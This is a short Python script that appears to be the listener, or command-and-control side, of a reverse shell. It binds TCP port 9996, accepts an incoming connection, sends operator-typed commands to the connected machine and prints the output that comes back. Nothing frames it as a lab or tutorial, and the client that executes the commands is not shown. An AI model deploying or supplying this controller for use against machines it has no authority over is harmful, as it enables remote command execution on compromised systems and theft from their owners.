import socket
import sys


def create_socket():
	try:
		global host
		global port
		global sock
		host = ""
		port = 9996
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	except socket.error as msg:
		print("Socket creation error: " + str(msg))

def bind_socket():
	try:
		global host
		global port
		global sock

		print("Binding the port " + str(port))
		sock.bind((host, port))
		sock.listen(5)

	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		bind_socket()


def socket_accept():
	conn, address = sock.accept()
	print("Connection has been established! " + "IP: " + address[0] + " Port: " + str(address[1]))
	send_commands(conn)

def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			sock.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			# Receive encoded client output and decode it
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")

def main():
	create_socket()
	bind_socket()
	socket_accept()


main()